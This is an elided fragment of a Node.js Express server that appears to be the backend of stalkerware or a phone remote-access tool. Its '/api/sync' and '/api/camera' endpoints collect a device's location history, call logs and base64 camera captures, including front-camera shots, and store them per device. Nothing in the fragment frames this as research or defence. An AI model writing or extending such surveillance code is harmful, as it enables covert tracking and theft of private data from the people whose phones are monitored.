...
// 1. SYNC - Battery, Location, Call Logs
app.post('/api/sync', (req, res) => {
    ...
    if (deviceName) devices[deviceId].name = deviceName;
    if (battery) devices[deviceId].battery = battery;
    if (location) devices[deviceId].locations.push({ ...location, time: Date.now() });
    if (callLogs && Array.isArray(callLogs)) devices[deviceId].callLogs = callLogs;
...
// 8. Gallery - IMAGES (base64 photos)
...
app.post('/api/camera', (req, res) => {
    ...
    if (devices[deviceId]) {
        ...
        devices[deviceId].gallery.push({ base64: photoBase64, timestamp: Date.now(), isFront, name: 'captured.jpg' });
        saveJSON(DATA_FILE, devices);
    }
    res.json({ ok: true });
});
